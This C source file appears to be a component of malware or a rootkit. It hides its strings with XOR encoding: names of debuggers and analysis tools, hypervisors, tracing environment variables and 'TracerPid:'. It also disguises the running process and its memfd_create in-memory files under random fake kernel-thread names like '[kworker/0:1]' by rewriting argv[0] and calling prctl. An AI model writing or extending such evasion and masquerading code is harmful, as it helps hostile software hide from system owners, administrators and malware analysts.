#include "common.h"
#include <string.h>
#include <time.h>

__attribute__((used))
volatile uint8_t g_str_xor_key = 0x5A;

__attribute__((used))
volatile uint8_t g_obf_str_block[241] = {
    /* tool_names */
    0x3D, 0x3E, 0x38,                                                           /* gdb       */
    0x29, 0x2E, 0x28, 0x3B, 0x39, 0x3F,                                         /* strace    */
    0x36, 0x2E, 0x28, 0x3B, 0x39, 0x3F,                                         /* ltrace    */
    0x28, 0x3B, 0x3E, 0x3B, 0x28, 0x3F, 0x68,                                   /* radare2   */
    0x35, 0x38, 0x30, 0x3E, 0x2F, 0x37, 0x2A,                                   /* objdump   */
    0x32, 0x3F, 0x22, 0x3E, 0x2F, 0x37, 0x2A,                                   /* hexdump   */
    0x3D, 0x32, 0x33, 0x3E, 0x28, 0x3B,                                         /* ghidra    */
    /* hyper_names */
    0x32, 0x23, 0x2A, 0x3F, 0x28, 0x2C, 0x33, 0x29, 0x35, 0x28,                 /* hypervisor */
    0x2B, 0x3F, 0x37, 0x2F,                                                     /* qemu      */
    0x31, 0x2C, 0x37,                                                            /* kvm       */
    0x22, 0x3F, 0x34,                                                            /* xen       */
    0x2C, 0x37, 0x2D, 0x3B, 0x28, 0x3F,                                         /* vmware    */
    0x2C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x38, 0x35, 0x22,                 /* virtualbox */
    /* env_names */
    0x16, 0x1E, 0x05, 0x0A, 0x08, 0x1F, 0x16, 0x15, 0x1B, 0x1E,                 /* LD_PRELOAD  */
    0x1D, 0x1E, 0x18,                                                            /* GDB         */
    0x0A, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x09, 0x19, 0x15, 0x0A, 0x1F,    /* PTRACE_SCOPE */
    0x09, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x16, 0x15, 0x1D,                 /* STRACE_LOG  */
    0x16, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x16, 0x15, 0x1D,                 /* LTRACE_LOG  */
    0x08, 0x1B, 0x1E, 0x1B, 0x08, 0x1F, 0x68, 0x05, 0x16, 0x15, 0x1D,          /* RADARE2_LOG */
    /* TracerPid: */
    0x0E, 0x28, 0x3B, 0x39, 0x3F, 0x28, 0x0A, 0x33, 0x3E, 0x60,                 /* TracerPid:  */
    /* innocent process names */
    0x01, 0x31, 0x2D, 0x35, 0x28, 0x31, 0x3F, 0x28, 0x75, 0x6A, 0x60, 0x6B, 0x07, /* kworker   */
    0x01, 0x31, 0x29, 0x35, 0x3C, 0x2E, 0x33, 0x28, 0x2B, 0x3E, 0x75, 0x6A, 0x07, /* ksoftirqd */
    0x01, 0x37, 0x33, 0x3D, 0x28, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x6A, 0x07, /* migration */
    0x01, 0x28, 0x39, 0x2F, 0x05, 0x3D, 0x2A, 0x07,                             /* rcugp      */
    0x01, 0x2D, 0x3B, 0x2E, 0x39, 0x32, 0x3E, 0x35, 0x3D, 0x75, 0x6A, 0x07,    /* watchdog   */
    0x01, 0x31, 0x39, 0x35, 0x37, 0x2A, 0x3B, 0x39, 0x2E, 0x3E, 0x6A, 0x07,    /* kcompactd  */
    0x01, 0x31, 0x29, 0x2D, 0x3B, 0x2A, 0x3E, 0x6A, 0x07,                       /* kswapd     */
    0x01, 0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x3E, 0x77, 0x30,
    0x35, 0x2F, 0x28, 0x34, 0x3B, 0x36, 0x07,                                   /* journal    */
};

static const struct { size_t off; size_t len; } innocent_table[] = {
    { STR_OFF_KWORKER,   STR_LEN_KWORKER   },
    { STR_OFF_KSOFTIRQD, STR_LEN_KSOFTIRQD },
    { STR_OFF_MIGRATION, STR_LEN_MIGRATION  },
    { STR_OFF_RCUGP,     STR_LEN_RCUGP     },
    { STR_OFF_WATCHDOG,  STR_LEN_WATCHDOG  },
    { STR_OFF_KCOMPACTD, STR_LEN_KCOMPACTD },
    { STR_OFF_KSWAPD,    STR_LEN_KSWAPD    },
    { STR_OFF_JOURNAL,   STR_LEN_JOURNAL   },
};

const char* get_random_innocent_name(void) {
    static char decoded[32];
    static int initialized = 0;
    if (!initialized) {
        srand(time(NULL));
        initialized = 1;
    }
    size_t count = sizeof(innocent_table) / sizeof(innocent_table[0]);
    size_t index = (size_t)(rand() % (int)count);
    size_t len = innocent_table[index].len;
    if (len >= sizeof(decoded)) len = sizeof(decoded) - 1;
    deobf_str_xor(decoded,
                  (const uint8_t*)g_obf_str_block + innocent_table[index].off,
                  len, (uint8_t)g_str_xor_key);
    decoded[len] = '\0';
    return decoded;
}

int create_masqueraded_memfd(void) {
    const char* name = get_random_innocent_name();
    return syscall2(__NR_memfd_create, (long)name, 0);
}

void hide_process_title(int argc, char* argv[]) {
#ifdef HARMLESS_MASQUERADE_ARGV0
    if (argc > 0 && argv && argv[0]) {
        size_t orig_len = strlen(argv[0]);
        memset(argv[0], 0, orig_len);
        const char* name = get_random_innocent_name();
        size_t copy_len = strlen(name);
        if (copy_len >= orig_len)
            copy_len = orig_len - 1;
        memcpy(argv[0], name, copy_len);
        argv[0][copy_len] = '\0';
        syscall3(__NR_prctl, PR_SET_NAME, (long)name, 0);
    }
#else
    (void)argc;
    (void)argv;
    syscall3(__NR_prctl, PR_SET_NAME, (long)get_random_innocent_name(), 0);
#endif
}
